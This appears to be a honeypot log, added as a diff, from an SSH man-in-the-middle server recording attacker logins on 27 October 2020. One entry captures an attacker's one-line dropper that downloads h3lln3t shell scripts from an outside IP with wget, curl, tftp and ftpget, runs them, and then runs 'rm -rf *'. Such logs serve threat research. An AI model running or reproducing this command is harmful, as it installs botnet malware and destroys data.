@@ -1,0 +1,33 @@
+2020-10-27 19:36:32.244 - [Info] MITM Version: 1.26
+2020-10-27 19:36:32.250 - [Info] Auto Access Enabled: true
+2020-10-27 19:36:32.251 - [Debug] [Init] Auto Access Barrier: true
+2020-10-27 19:36:32.273 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-10-27 19:36:32.929 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 19:36:34.685 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 19:36:34.687 - [Debug] [Auto Access] Attacker: 193.239.147.39, Threshold: 1, Attempts: 1
+2020-10-27 19:36:34.689 - [Debug] [Auto Access] Compromising the honeypot
+2020-10-27 19:36:34.689 - [Debug] [Auto Access] Adding the following credentials: "odoo:odoo"
+2020-10-27 19:36:35.926 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-10-27 19:36:35.927 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-10-27 19:36:51.395 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-10-27 19:36:51.851 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.14.224.170/h3lln3t.sh; curl -O http://45.14.224.170/h3lln3t.sh; chmod 777 h3lln3t.sh; sh h3lln3t.sh; tftp 45.14.224.170 -c get h3lln3t.sh; chmod 777 h3lln3t.sh; sh h3lln3t.sh; tftp -r h3lln3t2.sh -g 45.14.224.170; chmod 777 h3lln3t2.sh; sh h3lln3t2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.14.224.170 h3lln3t1.sh h3lln3t1.sh; sh h3lln3t1.sh; rm -rf h3lln3t.sh h3lln3t.sh h3lln3t2.sh h3lln3t1.sh; rm -rf *
+2020-10-27 19:36:53.693 - [Debug] [Connection] Attacker closed connection
+2020-10-27 19:36:53.711 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-10-27 19:36:53.712 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-10-27 19:37:16.289 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 19:37:17.880 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 19:37:17.882 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-27 19:37:17.884 - [Debug] [Auth] Attacker: 193.239.147.39 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 19:37:18.471 - [Debug] [Connection] Attacker closed the connection
+2020-10-27 19:37:59.636 - [Debug] [Connection] Attacker connected: 193.239.147.39 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-10-27 19:38:01.399 - [Debug] [Auth] Attacker 193.239.147.39 trying to authenticate with "password"
+2020-10-27 19:38:01.399 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2020-10-27 19:38:01.400 - [Debug] [Auth] Attacker: 193.239.147.39 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 19:38:01.727 - [Debug] [Connection] Attacker closed the connection
+2020-10-27 19:39:51.349 - [Debug] [Connection] Attacker connected: 195.3.147.47 | Client Identification: SSH-2.0-PuTTY_Release_0.62
+2020-10-27 19:39:52.895 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "none"
+2020-10-27 19:39:52.895 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2020-10-27 19:39:53.155 - [Debug] [Auth] Attacker 195.3.147.47 trying to authenticate with "password"
+2020-10-27 19:39:53.156 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-10-27 19:39:53.157 - [Debug] [Auth] Attacker: 195.3.147.47 has so far made 1 attempts. Remaining: 5 attempts
+2020-10-27 19:39:53.417 - [Debug] [Connection] Attacker closed the connection
